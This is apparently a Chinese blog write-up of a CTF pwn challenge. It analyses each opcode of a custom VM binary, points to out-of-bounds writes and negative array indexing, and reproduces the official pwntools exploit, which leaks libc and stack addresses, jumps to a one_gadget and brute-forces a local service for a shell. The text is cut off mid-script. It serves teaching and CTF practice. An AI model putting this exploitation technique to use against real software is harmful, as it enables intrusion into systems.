<p>说实话有点搞，但是还是只能一步步分析每个“case”的作用，以及可能的漏洞：</p>
<ul>
<li>case0：终止循环</li>
<li>case1：赋值v10为“enc_num”</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTE2(x)   SBYTEn(x,  2) <span class="comment">/* 右移16位然后取低8位 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTEn(x, n)   (*((int8*)&amp;(x)+n)) <span class="comment">/* 取(地址+2)的内容-第3字节 */</span></span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_8; <span class="comment">/* exit */</span></span><br><span class="line">          *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = enc_num; <span class="comment">/* 感觉v10有点溢出 */</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* 在(v10+SBYTE2(enc_num))的位置写入enc_num */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>case2：对v10进行加操作（后面的代码都是类似的）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">  <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">char</span>)enc_num &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = *((_WORD *)&amp;v10 + SBYTE1(enc_num)) + *((_WORD *)&amp;v10 + (<span class="keyword">char</span>)enc_num); </span><br><span class="line">  <span class="keyword">goto</span> LABEL_102;</span><br></pre></td></tr></table></figure>
<ul>
<li>case3：对v10进行减操作</li>
<li>case4：对v10进行与操作</li>
<li>case5：对v10进行或操作</li>
<li>case6：对v10进行位移操作</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">  <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = (<span class="keyword">int</span>)*((<span class="keyword">unsigned</span> __int16 *)&amp;v10 + SBYTE2(enc_num)) &gt;&gt; *((_WORD *)&amp;v10 + SBYTE1(enc_num));</span><br><span class="line">  <span class="keyword">goto</span> LABEL_102;</span><br></pre></td></tr></table></figure>
<ul>
<li>case7：对v10进行异或操作</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">7u</span>:                              </span><br><span class="line">  <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">char</span>)enc_num &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = *((_WORD *)&amp;v10 + SBYTE1(enc_num)) ^ *((_WORD *)&amp;v10 + (<span class="keyword">char</span>)enc_num);</span><br><span class="line">  <span class="keyword">goto</span> LABEL_102;</span><br></pre></td></tr></table></figure>
<ul>
<li>case8：乱码，只能看汇编</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000001780</span> loc_1780:                               ; DATA XREF: .rodata:jpt_13D6↓o</span><br><span class="line">.text:<span class="number">0000000000001780</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000001785</span>                 call    enc</span><br><span class="line">.text:<span class="number">000000000000178</span>A                 mov     [rbp+var_234], eax</span><br><span class="line">.text:<span class="number">0000000000001790</span>                 mov     eax, [rbp+var_234]</span><br><span class="line">.text:<span class="number">0000000000001796</span>                 mov     cs:index, eax</span><br><span class="line">.text:<span class="number">000000000000179</span>C                 jmp     loc_1A2B</span><br></pre></td></tr></table></figure>
<ul>
<li>case9：把v10赋值给v12</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 v9; <span class="comment">// [rsp+30h] [rbp-230h] /* 数组负溢出 */</span></span><br><span class="line">__int16 v12[<span class="number">260</span>]; <span class="comment">// [rsp+50h] [rbp-210h]</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">9u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( v9 &gt; <span class="number">256</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( BYTE2(enc_num) )</span><br><span class="line">            v12[v9] = enc_num;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            v12[v9] = v10;</span><br><span class="line">          ++v9;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br></pre></td></tr></table></figure>
<ul>
<li>case10：把v12赋值给v10</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0xA</span>u:</span><br><span class="line">  <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = v12[--v9];</span><br><span class="line">  <span class="keyword">goto</span> LABEL_102;</span><br></pre></td></tr></table></figure>
<ul>
<li>case11：再次执行“enc”，重置index</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0xB</span>u:</span><br><span class="line">  v8 = enc();</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    index = v8;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_102;</span><br></pre></td></tr></table></figure>
<ul>
<li>case12：比较</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0xC</span>u:                             </span><br><span class="line">  <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v4 = *((_WORD *)&amp;v10 + SBYTE2(enc_num)) == *((_WORD *)&amp;v10 + SBYTE1(enc_num));</span><br><span class="line">  <span class="keyword">goto</span> LABEL_102;</span><br></pre></td></tr></table></figure>
<ul>
<li>case13：对v10进行乘操作</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0xD</span>u:                             </span><br><span class="line">  <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">char</span>)enc_num &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = *((_WORD *)&amp;v10 + SBYTE1(enc_num)) * *((_WORD *)&amp;v10 + (<span class="keyword">char</span>)enc_num);</span><br><span class="line">  <span class="keyword">goto</span> LABEL_102;</span><br></pre></td></tr></table></figure>
<ul>
<li>case14：赋值v10</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0xE</span>u:</span><br><span class="line">  <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  *((_WORD *)&amp;v10 + SBYTE1(enc_num)) = *((_WORD *)&amp;v10 + SBYTE2(enc_num));</span><br><span class="line">  <span class="keyword">goto</span> LABEL_102;</span><br></pre></td></tr></table></figure>
<ul>
<li>case15：打印v12</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0xF</span>u:</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="keyword">unsigned</span> __int16)v12[v9]);</span><br><span class="line">  <span class="keyword">goto</span> LABEL_102;</span><br></pre></td></tr></table></figure>
<p>分析：首先这个“case15”一定是用来 leak libc_base 的（可能是：利用case9把v10赋值给v12，然后利用case15来打印v12）</p>
<p>在此之前还必须思考一下函数“enc”的逻辑以生成合适的“key”，程序原本的代码为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HIBYTE(x)   (*((_BYTE*)&amp;(x)+1)) <span class="comment">/* 让一个4字节的数据,保留第2个字节 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">__int64 <span class="title">enc</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> key; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  key = (*(_DWORD *)((<span class="keyword">char</span> *)&amp;code + index) &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xFF0000</span> | (*(_DWORD *)((<span class="keyword">char</span> *)&amp;code + index) &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00</span> | HIBYTE(*(_DWORD *)((<span class="keyword">char</span> *)&amp;code + index)) | (*(_DWORD *)((<span class="keyword">char</span> *)&amp;code + index) &lt;&lt; <span class="number">24</span>);</span><br><span class="line">  index += <span class="number">4</span>; <span class="comment">/* 每次操作4字节 */</span></span><br><span class="line">  <span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用 python 进行简化处理：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="number">9</span> <span class="comment"># input(4byte)</span></span><br><span class="line">enc_num = ((code &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xFF0000</span>) | ((code &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00</span>) | ((code &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>)| ((code &lt;&lt; <span class="number">24</span>) &amp; <span class="number">0xff000000</span>)</span><br><span class="line">key=(enc_num &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;enc_num=&quot;</span>+<span class="built_in">str</span>(enc_num))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;key=&quot;</span>+<span class="built_in">str</span>(key))</span><br></pre></td></tr></table></figure>
<p>经过多轮测试：4字节“input”的最后1字节就是“key”（解决了“key”的问题，还有很多谜团，程序有意把4字节的code按照地址高低分为4部分，我不知道为什么）</p>
<p>我觉得我到此为止了，目前还有以下几个问题需要解决：</p>
<ul>
<li>控制v12进行打印（leak libc_base and pro_base）</li>
<li>最终的入侵手段（hook or ret-system）</li>
<li>漏洞利用点（我勉强能分析清楚程序的意思，但利用点就不清楚了）</li>
</ul>
<p><strong>复现官方wp</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack</span>(<span class="params">op:<span class="built_in">int</span>, p1:<span class="built_in">int</span> = <span class="number">0</span>, p2:<span class="built_in">int</span> = <span class="number">0</span>, p3:<span class="built_in">int</span> = <span class="number">0</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">   <span class="keyword">return</span> (op&amp;<span class="number">0xff</span>).to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>) + \</span><br><span class="line">          (p1&amp;<span class="number">0xff</span>).to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>) + \</span><br><span class="line">          (p2&amp;<span class="number">0xff</span>).to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>) + \</span><br><span class="line">          (p3&amp;<span class="number">0xff</span>).to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ldr</span>(<span class="params">val</span>):</span> <span class="comment"># v10=p1(offset1)~p2(offset2)~p3(offset3)</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x01</span>, <span class="number">0</span>, val &gt;&gt; <span class="number">8</span>, val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p1, p2, p3</span>):</span> <span class="comment"># *(&amp;v10+p1)=*(&amp;v10+p2) + *(&amp;v10+p3)</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x02</span>, p1, p2, p3)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub</span>(<span class="params">p1, p2, p3</span>):</span> <span class="comment"># *(&amp;v10+p1)=*(&amp;v10+p2) - *(&amp;v10+p3)</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x03</span>, p1, p2, p3)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shr</span>(<span class="params">p1, p2</span>):</span> <span class="comment"># *(&amp;v10+p1)=*(&amp;v10+p1) &gt;&gt; *(&amp;v10+p2)</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x06</span>, p1, p2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">p1, p2, p3</span>):</span> <span class="comment"># *(&amp;v10+p1)=*(&amp;v10+p2) ^ *(&amp;v10+p3)</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x07</span>, p1, p2, p3)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">push</span>():</span> <span class="comment"># v12=v10(ban &quot;v12=*(&amp;v10+p1)&quot;)</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x09</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pop</span>(<span class="params">p1</span>):</span> <span class="comment"># *(&amp;v10+p1)=v12</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x0a</span>, p1)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">p1, p2, p3</span>):</span> <span class="comment"># *(&amp;v10+p1)=*(&amp;v10+p2) * *(&amp;v10+p3)</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x0D</span>, p1, p2, p3)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mv</span>(<span class="params">p1, p2</span>):</span> <span class="comment"># *(&amp;v10+p2) = *(&amp;v10+p1)</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x0E</span>, p1, p2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sh</span>():</span> <span class="comment"># show</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x0F</span>)</span><br><span class="line"></span><br><span class="line">puts_offset = <span class="number">0x845ca</span></span><br><span class="line">puts_leak = (<span class="number">0x38</span> + <span class="number">0x268</span> - <span class="number">0x224</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">onegadgetlst = [<span class="number">0xe3b2e</span>, <span class="number">0xe3b31</span>, <span class="number">0xe3b34</span>]</span><br><span class="line">onegadget = onegadgetlst[<span class="number">0</span>]</span><br><span class="line">toadd = onegadget - puts_offset</span><br><span class="line">stack_leak = (<span class="number">0x268</span> - <span class="number">0x224</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">stack_pointer_leak = (<span class="number">0x238</span> - <span class="number">0x224</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">tosub = <span class="number">0x1a799e</span> + <span class="number">0x308</span></span><br><span class="line"><span class="comment"># tosub = 0x1a399e + 0x308   # debug aslr</span></span><br><span class="line">tosub = tosub - <span class="number">0x3000</span>  <span class="comment"># no aslr : player environment</span></span><br><span class="line">tosub = tosub - <span class="number">0x4000</span>  <span class="comment"># aslr : player environment</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># - 0x308 + stack_leak - puts + 0x1a799e</span></span><br><span class="line">pay = ldr(<span class="number">0x1</span>)</span><br><span class="line">pay += mv(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">pay += ldr(tosub&amp;<span class="number">0xffff</span>)</span><br><span class="line">pay += mv(<span class="number">0</span>,<span class="number">3</span>)</span><br><span class="line">pay += mul(<span class="number">4</span>,-puts_leak,<span class="number">1</span>)</span><br><span class="line">pay += mul(<span class="number">5</span>,-stack_leak,<span class="number">1</span>)</span><br><span class="line">pay += sub(<span class="number">0</span>,<span class="number">5</span>,<span class="number">4</span>)</span><br><span class="line">pay += sub(<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>)</span><br><span class="line">pay += shr(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">pay += push()</span><br><span class="line"></span><br><span class="line">pay += ldr((tosub&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)</span><br><span class="line">pay += mv(<span class="number">0</span>,<span class="number">3</span>)</span><br><span class="line">pay += mul(<span class="number">4</span>,-puts_leak+<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">pay += mul(<span class="number">5</span>,-stack_leak+<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">pay += sub(<span class="number">0</span>,<span class="number">5</span>,<span class="number">4</span>)</span><br><span class="line">pay += sub(<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>)</span><br><span class="line">pay += shr(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">pay += push()</span><br><span class="line"></span><br><span class="line"><span class="comment"># onegadget</span></span><br><span class="line">pay += mul(<span class="number">3</span>,-puts_leak,<span class="number">1</span>)</span><br><span class="line">pay += mul(<span class="number">4</span>,-puts_leak+<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">pay += ldr(toadd&amp;<span class="number">0xffff</span>)</span><br><span class="line">pay += add(<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>)</span><br><span class="line">pay += push()</span><br><span class="line">pay += ldr(((toadd&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)+<span class="number">1</span>)</span><br><span class="line">pay += add(<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line">pay += push()</span><br><span class="line">pay += mul(<span class="number">0</span>,-puts_leak+<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">pay += push()</span><br><span class="line">pay += pop(<span class="number">3</span>)</span><br><span class="line">pay += pop(<span class="number">4</span>)</span><br><span class="line">pay += pop(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">pay += pop(<span class="number">1</span>)</span><br><span class="line">pay += pop(<span class="number">2</span>)</span><br><span class="line">pay += ldr(<span class="number">0xffff</span>)</span><br><span class="line">pay += xor(<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">pay += ldr(<span class="number">1</span>)</span><br><span class="line">pay += add(<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">pay += mv(<span class="number">2</span>,-stack_pointer_leak)</span><br><span class="line">pay += ldr(<span class="number">0xffff</span>)</span><br><span class="line">pay += xor(<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">pay += mv(<span class="number">1</span>,-stack_pointer_leak+<span class="number">1</span>)</span><br><span class="line">pay += mv(<span class="number">0</span>,-stack_pointer_leak+<span class="number">2</span>)</span><br><span class="line">pay += mv(<span class="number">0</span>,-stack_pointer_leak+<span class="number">3</span>)</span><br><span class="line">pay += mv(<span class="number">5</span>,<span class="number">0</span>)</span><br><span class="line">pay += push()</span><br><span class="line">pay += mv(<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line">pay += push()</span><br><span class="line">pay += mv(<span class="number">3</span>,<span class="number">0</span>)</span><br><span class="line">pay += push()</span><br><span class="line">pay += ldr(<span class="number">0</span>)</span><br><span class="line">pay += push()</span><br><span class="line"></span><br><span class="line">pay += sh()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(pay)))</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(pay) &lt;= <span class="number">0x100</span></span><br><span class="line">pay = pay.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chance of this exp : about 1230 - 10125 times with 1 flag</span></span><br><span class="line"><span class="comment"># I admit this is an awful exp</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   p=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">   p.sendafter(<span class="string">&#x27;\n&#x27;</span>,pay)</span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">       p.recvuntil(<span class="string">&#x27;starting ...\n&#x27;</span>)</span><br><span class="line">       p.recvline()</span><br><span class="line">       p.recvuntil(<span class="string">&#x27;down ...\n&#x27;</span>)</span><br><span class="line">       p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">       res = p.recvline()</span><br><span class="line">       <span class="built_in">print</span>(<span 